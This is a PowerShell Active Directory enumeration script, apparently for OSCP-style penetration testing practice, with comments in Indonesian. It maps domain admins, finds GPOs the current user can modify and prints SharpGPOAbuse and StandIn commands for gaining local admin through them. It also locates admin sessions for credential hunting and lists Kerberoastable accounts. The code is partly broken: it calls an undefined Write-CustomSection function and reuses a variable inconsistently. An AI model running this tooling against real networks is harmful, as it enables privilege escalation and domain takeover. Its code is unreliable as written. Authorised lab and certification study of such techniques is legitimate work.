# ===============================
# AD ENUM REPORT (OSCP STYLE - FINAL)
# powershell -NoProfile -ExecutionPolicy Bypass -File ./adenum.ps1
# Prerequisite: PowerView.ps1 dan PsLoggedon64.exe
# Note: Sharphound and Bloodhound to analyze shortest path to Domain Admin (Separate Tools)
# ===============================

$outfile = "$env:USERPROFILE\ad_enum_report.txt"
Remove-Item $outfile -ErrorAction SilentlyContinue

function write-section {
    param($title)
    Add-Content $outfile "`n========== $title =========="
}

Write-Host "[+] Saving report to $outfile"

# ===============================
# LOAD POWERVIEW
# ===============================
if (-not (Get-Command Get-DomainUser -ErrorAction SilentlyContinue)) {
    try {
        . .\PowerView.ps1
    } catch {
        Write-Host "[!] PowerView.ps1 not found!"
        exit
    }
}

# ===============================
# GET DOMAIN (biar konsisten format user@domain)
# ===============================
$domain = (Get-Domain).Name

# ===============================
# 1. HOSTS
# ===============================
write-section "HOSTS"

$hosts = Get-DomainComputer

if ($hosts.Count -eq 0) {
    Add-Content $outfile "Null"
} else {
    $hosts | ForEach-Object {
        $ip = ""
        try {
            $ip = ([System.Net.Dns]::GetHostAddresses($_.dnshostname) |
            Where-Object {$_.AddressFamily -eq "InterNetwork"} |
            Select -First 1).IPAddressToString
        } catch {}

        "$($_.dnshostname);$($_.OperatingSystem);$ip" | Add-Content $outfile
    }
}

# ===============================
# 2. USERS
# ===============================
write-section "USERS"

$users = Get-DomainUser

if ($users.Count -eq 0) {
    Add-Content $outfile "Null"
} else {
    $users | ForEach-Object {
        "$($_.samaccountname)@$domain" | Add-Content $outfile
    }
}

# =============================================================
# 3. ADMIN GROUP MEMBERS (UPGRADED FROM SCRIPT 9)
# =============================================================
write-section "ADMIN GROUP MEMBERS (BLOODHOUND STYLE)"

$currentSID = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
$currentUser = whoami

# Definisikan target grup yang krusial
$targetGroups = @("Domain Admins", "Administrators", "Enterprise Admins")
$allAdmins = @() # Inisialisasi variabel global untuk dipakai di Script 6 nanti

foreach ($groupName in $targetGroups) {
    # Ambil member secara mendalam (Recurse)
    $admins = Get-DomainGroupMember -Identity $groupName -Recurse -ErrorAction SilentlyContinue

    if ($admins) {
        $allAdmins += $admins # Simpan ke variabel global
        Add-Content $outfile "--- Group: $groupName ---"
        
        $admins | ForEach-Object {
            $name = $_.MemberName
            $sid  = $_.MemberSID
            $type = $_.ObjectClass 

            $line = "$name ($type);$sid"

            # Highlight jika itu akun kamu sendiri
            if ($sid -eq $currentSID -or $name -match $currentUser) {
                $line = "[CURRENT ADMIN] $line"
            }

            Add-Content $outfile $line
        }
    }
}

# ===============================
# 4. GROUPS (WITH DESCRIPTIONS)
# ===============================
write-section "GROUPS"

# Ambil Nama dan Deskripsi biar kita tahu fungsi grup itu buat apa
$groups = Get-DomainGroup -Properties Name, Description

if ($groups.Count -eq 0) {
    Add-Content $outfile "Null"
} else {
    foreach ($g in $groups) {
        $line = "$($g.Name) -- Description: $($g.Description)"
        Add-Content $outfile $line
    }
}

# ===============================
# 5. GPO (ENUM + PRIVILEGE CHECK)
# ===============================
write-section "GPO"

$gpos = Get-DomainGPO

if ($gpos.Count -eq 0) {
    Add-Content $outfile "Null"
}
else {
    $gpos | Select-Object -ExpandProperty displayname | Add-Content $outfile
}

$me = whoami
$gpos = Get-DomainGPO

if ($gpos.Count -eq 0) {
    Add-Content $outfile "Null"
    return
}

Add-Content $outfile "`n[+] Current User: $me"
Add-Content $outfile "`n[+] GPO Enumeration + Privilege Mapping:`n"

$domain = Get-DomainObject -SearchScope Base
$domainLinks = $domain.gplink

$ous = Get-DomainOU
$sites = Get-DomainSite

$foundExploit = $false

foreach ($gpo in $gpos) {

    $acls = Get-DomainObjectAcl -Identity $gpo.distinguishedname -ResolveGUIDs | Where-Object {
        $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner"
    }

    foreach ($acl in $acls) {

        try {
            $identity = ConvertFrom-SID $acl.SecurityIdentifier
        } catch {
            continue
        }

        if ($identity -ne $me) { continue }

        # ===============================
        # Scope detection
        # ===============================
        $scope = @()

        if ($domainLinks -like "*$($gpo.name)*") {
            $scope += "Domain"
        }

        foreach ($ou in $ous) {
            if ($ou.gplink -like "*$($gpo.name)*") {
                $scope += "OU:$($ou.name)"
            }
        }

        foreach ($site in $sites) {
            if ($site.gplink -like "*$($gpo.name)*") {
                $scope += "Site:$($site.name)"
            }
        }

        if ($scope.Count -eq 0) { $scope = "Unknown" } else { $scope = $scope -join "," }

        # ===============================
        # Decide exploitability
        # ===============================
        $impact = ""
        if ($scope -match "Domain") {
            $impact = "HIGH (Domain-wide takeover possible)"
        } elseif ($scope -match "OU") {
            $impact = "MEDIUM (Lateral movement possible)"
        } else {
            $impact = "LOW/UNKNOWN"
        }

        $foundExploit = $true

        # ===============================
        # OUTPUT
        # ===============================
        Add-Content $outfile "------------------------------------"
        Add-Content $outfile "[!] EXPLOITABLE GPO FOUND"
        Add-Content $outfile "User    : $identity"
        Add-Content $outfile "GPO     : $($gpo.displayname)"
        Add-Content $outfile "Rights  : $($acl.ActiveDirectoryRights)"
        Add-Content $outfile "Scope   : $scope"
        Add-Content $outfile "Impact  : $impact"
        Add-Content $outfile "------------------------------------"
        Add-Content $outfile ""
    }
}

# ===============================
# Summary
# ===============================
if (-not $foundExploit) {
    Add-Content $outfile "[+] No exploitable GPO rights found for current user"
} else {
    Add-Content $outfile "Choose attack method"
    
    Add-Content $outfile "   Option A - SharpGPOAbuse"
    Add-Content $outfile "   Example:"
    Add-Content $outfile "   SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName <TARGET_GPO>"
    Add-Content $outfile "   → Result: user becomes local admin on all linked machines"
    
    Add-Content $outfile ""
    Add-Content $outfile "   Option B - StandIn (enumeration + modification)"
    Add-Content $outfile "   - List GPOs:"
    Add-Content $outfile "     StandIn.exe --gpo"
    Add-Content $outfile "   - Check ACL:"
    Add-Content $outfile "     StandIn.exe --gpo --filter <GPO_NAME> --acl"
    Add-Content $outfile "   - Abuse:"
    Add-Content $outfile "     StandIn.exe --gpo --filter <GPO_NAME> --localadmin $me"

}

# =============================================================
# 6. BLOODHOUND-LIKE (ACTIONABLE QUERIES)
# =============================================================
# Asumsi: Script 9 sudah jalan dan mengisi variabel $allAdmins

Write-CustomSection "LOCAL ADMIN ACCESS (Where can I go?)"
# Mencari di mana akun kamu saat ini punya hak Local Admin secara langsung
try {
    Find-LocalAdminAccess -ErrorAction SilentlyContinue | ForEach-Object {
        $line = "[+] LOCAL ADMIN ACCESS FOUND: $_"
        Add-Content $outfile $line
        Write-Host $line -ForegroundColor Green
    }
} catch { }

Write-CustomSection "REMOTE DESKTOP USERS (RDP Access)"
# Mencari komputer mana yang membolehkan 'Domain Users' login via RDP
$allComputers = Get-DomainComputer -Properties Name -ErrorAction SilentlyContinue
foreach ($comp in $allComputers.Name) {
    try {
        $rdpMembers = Get-NetLocalGroupMember -ComputerName $comp -GroupName "Remote Desktop Users" -ErrorAction Stop
        foreach ($member in $rdpMembers) {
            # BloodHound Logic: Jika Domain Users bisa RDP, itu celah besar
            if ($member.MemberName -match "Domain Users") {
                $line = "[!] RDP RISK: 'Domain Users' group can RDP to $comp"
                Add-Content $outfile $line
                Write-Host $line -ForegroundColor Yellow
            }
        }
    } catch { }
}

Write-CustomSection "DOMAIN USERS AS LOCAL ADMIN"
# Cek miskonfigurasi: Apakah Domain Users dimasukkan ke grup Administrators lokal?
foreach ($comp in $allComputers.Name) {
    try {
        $localAdmins = Get-NetLocalGroupMember -ComputerName $comp -GroupName "Administrators" -ErrorAction Stop
        foreach ($admin in $localAdmins) {
            if ($admin.MemberName -match "Domain Users") {
                $line = "[!!!] CRITICAL: 'Domain Users' is Local Admin on $comp"
                Add-Content $outfile $line
                Write-Host $line -ForegroundColor Red
            }
        }
    } catch { continue }
}

Write-CustomSection "SHORTEST PATH - SESSIONS (Hunting Admins)"
# Menggunakan data dari Script 9 ($allAdmins) untuk mencari di mana mereka login
if ($allAdmins) {
    # Ambil nama unik saja supaya tidak scanning berulang untuk user yang sama
    $uniqueAdminNames = $allAdmins.MemberName | Select-Object -Unique
    
    foreach ($adminName in $uniqueAdminNames) {
        # Cari session aktif user admin tersebut di jaringan
        $sessions = Get-NetSession -UserName $adminName -ErrorAction SilentlyContinue
        if ($sessions) {
            foreach ($s in $sessions) {
                $line = "[*] PATH: Admin [$adminName] is logged into [$($s.ComputerName)]"
                Add-Content $outfile $line
                Write-Host $line -ForegroundColor Magenta
            }
        }
    }
}

# ===============================
# 7. ACTIVE SESSIONS (PsLoggedon)
# ===============================
write-section "ACTIVE SESSIONS"

$results = @()

try {
    $targets = Get-DomainComputer | Select -ExpandProperty dnshostname
} catch {
    $targets = @()
}

foreach ($target in $targets) {

    $tmp = "$env:TEMP\pslog_$target.txt"

    try {
        # Run via CMD + redirect output (anti hang)
        cmd /c "PsLoggedon64.exe \\$target -accepteula > $tmp 2>&1"

        if (Test-Path $tmp) {

            $content = Get-Content $tmp

            foreach ($line in $content) {
            
                if ($line -match "\\" -and $line -notmatch "Users logged on") {
            
                    $clean = $line.Trim()
                    $short = $target.Split('.')[0]
            
                    $results += "$short;$clean"
                }
            }

            Remove-Item $tmp -ErrorAction SilentlyContinue
        }

    } catch {}
}

if ($results.Count -eq 0) {
    Add-Content $outfile "Null"
} else {
    $results | Sort-Object -Unique | Add-Content $outfile
}

# ===============================
# 8. KERBEROASTABLE USERS
# ===============================
write-section "KERBEROASTABLE USERS"

$spn = Get-DomainUser -SPN
$domainName = (Get-Domain).dnsroot

if ($spn.Count -eq 0) {
    Add-Content $outfile "Null"
} else {
    $spn | ForEach-Object {
        "$($_.samaccountname)@$domainName;$($_.serviceprincipalname)" | Add-Content $outfile
    }
}

# ===============================
# DONE
# ===============================
Write-Host "[+] DONE!"
Write-Host "[+] Report saved to: $outfile"
